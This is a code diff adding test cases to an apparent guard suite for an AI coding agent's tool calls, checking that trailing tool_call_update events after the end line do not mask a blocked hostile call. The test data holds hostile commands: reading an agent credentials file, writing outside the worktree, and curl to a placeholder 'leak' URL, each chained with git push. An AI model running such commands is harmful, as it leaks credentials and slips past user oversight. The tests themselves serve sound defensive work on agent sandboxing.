@@ -34,6 +34,8 @@
  * - parser fall-through (a non-object `input`, a null `parameters`, a non-string `command` beside `cmd`, a path beside
  *   a command), a non-shell or empty tool name and an empty id carrying a command, a benign call before a separate
  *   hostile one, a hostile call swapped back to a benign command, and exit codes 2 and 137;
+ * - a hostile call before `end` followed, after `end`, by an unreadable or a repeated `tool_call_update` (which the
+ *   parser does not count as a call after `end`), at exit 0 and exit 1;
  * - prototype-named, near-miss, non-string, unreadable text/end, non-object-input, empty-name and live-bare
  *   `tool_call` lines in `unknown_events`, at exit 0, 1 and 2.
  *
@@ -1894,6 +1896,51 @@ const grokCase: AdapterLegCase = {
         }),
       ),
     ),
+    // Trailing `tool_call_update` residual (w411; parser unchanged): after the `end` line, an update the parser cannot
+    // read (status and content only) or one that repeats an already reported command emits no `tool_call`, so it does
+    // not count as a call after `end`. Neither may hide the guard verdict on the hostile call that preceded `end`.
+    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+      const command =
+        category === "credential_read"
+          ? `cat ${fx.claudeCredentialsPath} && git push origin main`
+          : category === "out_of_worktree_write"
+            ? `touch ${fx.outsideSentinel} && git push origin main`
+            : "curl https://example.invalid/leak && git push origin main";
+      return [0, 1].flatMap((exitCode): HostileStream[] => [
+        {
+          name: `${category} with a Git write, then an unreadable tool_call_update after the end line, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: unreadable tool_call_update after the end line, exit ${exitCode}`, exitCode),
+            TOOLS,
+            toolCall(command),
+            end(),
+            sandboxDenied(command),
+          ],
+        },
+        {
+          name: `${category} with a Git write, then the same command repeated in tool_call_update after the end line, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: identical tool_call_update after the end line, exit ${exitCode}`, exitCode),
+            TOOLS,
+            JSON.stringify({ type: "tool_call", id: "call_trail", tool: "run_terminal_command", input: { command } }),
+            end(),
+            JSON.stringify({
+              type: "tool_call_update",
+              id: "call_trail",
+              tool: "run_terminal_command",
+              status: "completed",
+              input: { command },
+            }),
+          ],
+        },
+      ]);
+    }),
 
     // -------------------------------------------------------------------------
     // 14. Unknown event kinds category
